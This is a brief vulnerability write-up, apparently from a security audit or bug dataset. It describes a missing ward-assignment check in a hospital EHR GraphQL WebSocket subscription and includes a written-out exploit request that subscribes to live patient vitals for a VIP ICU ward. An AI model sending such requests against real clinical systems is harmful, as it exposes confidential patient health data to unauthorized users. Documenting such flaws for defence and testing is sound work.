diagnosis: The subscription accepts ward_code as a client argument and subscribes the WebSocket consumer to real-time vital signs broadcasts without verifying that the requesting physician or staff member is actively assigned to that ward. Any authenticated clinical portal user can monitor confidential patient heart rates, arterial pressures, and resuscitation alarms in psychiatric or VIP ICU units.
exploit_request:
POST /api/clinical/ws/graphql/ HTTP/1.1
Host: ehr.stjude-hospital.org
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: graphql-ws

{"type":"start","id":"sub_ward","payload":{"query":"subscription { patientVitals(wardCode: \"WARD-VIP-ICU-04\") { vitals { patientId heartRate spo2 bpSystolic } } }"}}
